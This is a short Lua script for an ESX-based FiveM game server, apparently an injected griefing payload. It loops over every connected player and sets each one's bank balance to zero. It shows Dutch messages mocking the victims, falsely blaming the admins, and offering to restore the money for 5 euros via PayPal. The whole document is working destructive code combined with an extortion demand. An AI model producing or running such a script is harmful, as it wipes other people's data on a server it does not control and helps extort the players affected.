TriggerClientEvent('esx:showNotification',-1, "Hacken is niet cool blijkbaar")
local playerList = ESX.GetPlayers()
for i=1, #playerList, 1 do
    local _source = playerList[i]
    local xPlayer = ESX.GetPlayerFromId(_source)
    xPlayer.showNotification("Ik moest van de admins het geld verwijderen :(")
    xPlayer.showNotification("Voor 5 euro paypal geef ik je het geld terug")
    xPlayer.setAccountMoney("bank", 0)
end
